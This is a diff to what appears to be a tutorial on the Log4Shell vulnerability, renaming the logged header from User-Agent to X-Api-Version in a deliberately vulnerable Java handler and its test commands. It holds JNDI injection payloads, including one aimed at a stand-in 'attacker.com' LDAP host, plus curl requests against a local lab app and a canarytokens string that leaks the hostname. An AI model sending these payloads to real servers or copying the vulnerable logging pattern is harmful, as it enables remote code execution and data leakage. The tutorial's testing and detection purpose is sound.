@@ -150,18 +150,18 @@ public class VulnerableLog4jExampleHandler implements HttpHandler {
   static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
 
   /**
-   * A simple HTTP endpoint that reads the request's User Agent and logs it back.
-   * This is basically pseudo-code to explain the vulnerability, and not a full example.
+   * A simple HTTP endpoint that reads the request's x-api-version header and logs it back.
+   * This is pseudo-code to explain the vulnerability, and not a full example.
    * @param he HTTP Request Object
    */
   public void handle(HttpExchange he) throws IOException {
-    String userAgent = he.getRequestHeader("user-agent");
+    String apiVersion = he.getRequestHeader("X-Api-Version");
 
-    // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
-    // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
-    log.info("Request User Agent:{}", userAgent);
+    // This line triggers the RCE by logging the attacker-controlled HTTP header.
+    // The attacker can set their X-Api-Version header to: ${jndi:ldap://attacker.com/a}
+    log.info("Requested Api Version:{}", apiVersion);
 
-    String response = "<h1>Hello There, " + userAgent + "!</h1>";
+    String response = "<h1>Hello from: " + apiVersion + "!</h1>";
     he.sendResponseHeaders(200, response.length());
     OutputStream os = he.getResponseBody();
     os.write(response.getBytes());
@@ -183,7 +183,7 @@ docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 and in another:
 
 ```shell
-curl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://127.0.0.1/a}'
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://127.0.0.1/a}'
 ```
 
 the logs should include an error message indicating that a remote lookup was attempted but failed:
@@ -215,7 +215,7 @@ of a free online DNS logging tool in the exploit string, we can detect when the 
 [CanaryTokens.org](https://canarytokens.org/generate#) is an Open Source web app for this purpose that even generates the exploit string automatically 
 and sends an email notification when the DNS is queried.  Select `Log4Shell` from the drop-down menu. Then, embed the string 
 in a request field that you expect the server to log.  This could be an anything from a form
-input to an HTTP header.  In our example above, the User-Agent header was being logged. This request should trigger it:
+input to an HTTP header.  In our example above, the X-Api-Version header was being logged. This request should trigger it:
 
 ```shell
 curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://x${hostName}.L4J.<RANDOM_STRING>.canarytokens.com/a}'
